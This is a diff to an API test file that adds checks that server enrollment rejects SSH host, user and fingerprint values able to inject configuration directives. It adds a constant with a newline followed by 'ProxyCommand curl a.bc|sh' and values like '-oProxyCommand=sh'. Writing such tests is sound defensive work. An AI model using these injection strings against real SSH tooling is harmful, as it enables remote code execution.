@@ -1,11 +1,13 @@
 import { beforeAll, beforeEach, describe, expect, it } from "bun:test"
 import { SEATED_STATUSES } from "../../lib/billing/seats"
 import { authorizedKeysForServer } from "../../lib/servers/authorized-keys"
+import { enrollServer } from "../../lib/servers/enrollment"
 import {
   DECOMMISSION_DELAY_MS,
   decommissionDueServers,
 } from "../../lib/servers/expire"
 import { CHART_MAX_POINTS } from "../../lib/servers/metrics"
+import { SshAddressInvalidError } from "../../lib/servers/ssh-address"
 import { bootApiTestServer, resetDb } from "../../testing"
 import { createOrganizationWithMembers } from "../../testing/factories"
 import { ED25519_KEY, SECOND_ED25519_KEY } from "../../testing/keys"
@@ -49,6 +51,8 @@ interface ErrorBody {
 }
 
 const DAY_MS = 86_400_000
+
+const SSH_INJECTION = "x\nProxyCommand curl a.bc|sh"
 
 function addDevice(session: Session, name: string, publicKey: string) {
   return apiRequest<{ data: { id: string } }>("/me/devices", {
@@ -349,7 +353,7 @@ describe("POST /servers/enroll", () => {
 
     expect(servers).toHaveLength(1)
     expect(servers[0]?.status).toBe("enrolling")
-    expect(servers[0]?.sshUser).toBe("ops")
+    expect(servers[0]?.sshUser).toBe("dev")
     expect(servers[0]?.serverTokenHash).toBeNull()
   })
 
@@ -522,6 +526,87 @@ describe("POST /servers/enroll", () => {
 
     expect(stored.host).toBe("vps.test")
     expect(stored.name).toBe("vps.test")
+  })
+
+  it("refuses an address or an account that would reach an SSH configuration as a directive", async () => {
+    const { prisma } = await bootApiTestServer()
+    const { organization, members } = await createOrganizationWithMembers({
+      roles: ["owner", "member"],
+      subscription: {},
+    })
+    const [, member] = members
+    const device = await addDevice(member, "MacBook", ED25519_KEY)
+    const deviceId = device.json.data.id
+    const refused = [
+      await enroll(member, deviceId, "vps.test", { ssh_user: SSH_INJECTION }),
+      await enroll(member, deviceId, "vps.test", {
+        ssh_user: "-oProxyCommand=sh",
+      }),
+      await enroll(member, deviceId, SSH_INJECTION),
+      await enroll(member, deviceId, "-oProxyCommand=sh"),
+      await enroll(member, deviceId, "vps.test%h"),
+      await enroll(member, deviceId, "vps.test", {
+        fingerprint: `SHA256:abc${SSH_INJECTION}`,
+      }),
+    ]
+
+    for (const response of refused) {
+      expect(response.status).toBe(422)
+      expect(response.json.error.code).toBe("validation")
+    }
+
+    expect(refused[2]?.json.error.message).toContain("host")
+    expect(
+      await prisma.server.count({ where: { organizationId: organization.id } })
+    ).toBe(0)
+  })
+
+  it("enrolls an IPv6 address as it is typed", async () => {
+    const { prisma } = await bootApiTestServer()
+    const { members } = await createOrganizationWithMembers({
+      roles: ["owner"],
+      subscription: {},
+    })
+    const [owner] = members
+    const device = await addDevice(owner, "MacBook", ED25519_KEY)
+    const response = await enroll(owner, device.json.data.id, "2001:DB8::1")
+
+    expect(response.status).toBe(201)
+
+    const server = await prisma.server.findUniqueOrThrow({
+      where: { id: response.json.server_id },
+    })
+
+    expect(server.host).toBe("2001:db8::1")
+  })
+
+  it("never writes a malformed address, even when the schema is bypassed", async () => {
+    const { prisma } = await bootApiTestServer()
+    const { organization, members } = await createOrganizationWithMembers({
+      roles: ["owner"],
+      subscription: {},
+    })
+    const [owner] = members
+    const device = await addDevice(owner, "MacBook", ED25519_KEY)
+    const actor = { userId: owner.user.id, organizationId: organization.id }
+    const input = {
+      device_id: device.json.data.id,
+      host: "vps.test",
+      probe: PROBE_REPORT,
+    }
+
+    await expect(
+      enrollServer(actor, { ...input, ssh_user: SSH_INJECTION })
+    ).rejects.toBeInstanceOf(SshAddressInvalidError)
+    await expect(
+      enrollServer(actor, { ...input, host: SSH_INJECTION })
+    ).rejects.toBeInstanceOf(SshAddressInvalidError)
+    await expect(
+      enrollServer(actor, { ...input, fingerprint: "SHA256:a b" })
+    ).rejects.toBeInstanceOf(SshAddressInvalidError)
+    expect(
+      await prisma.server.count({ where: { organizationId: organization.id } })
+    ).toBe(0)
   })
 
   it("keeps a repaired server in the entitlement its organization holds", async () => {
